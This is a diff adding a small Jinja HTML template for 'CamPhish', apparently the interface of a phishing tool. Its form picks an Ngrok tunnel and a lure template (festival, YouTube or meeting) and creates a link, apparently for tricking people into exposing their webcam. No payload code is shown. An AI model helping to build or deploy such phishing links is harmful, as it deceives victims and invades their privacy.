@@ -1,0 +1,28 @@
+{% extends 'base.html' %}
+
+{% block head %}
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/Camphish.css') }}">
+    <title>CamPhish</title>
+{% endblock %}
+
+
+
+{% block body %}
+    <div id="content">
+        <form action="/" method="get">
+            <hr>
+            <select name="port_forwarding" id="port_forwarding">
+                <option value="ngrok">Ngrok</option>
+                <option value="serveo" disabled>Serveo.net | Not yet implemented</option>                
+            </select>
+            <hr>
+            <select name="template" id="template">
+                <option value="festival">Festival</option>
+                <option value="youtube">Youtube</option>
+                <option value="meeting">Meeting</option>
+            </select>
+            <hr>
+            <input type="submit" value="Create Link">
+        </form>
+    </div>
+{% endblock %}
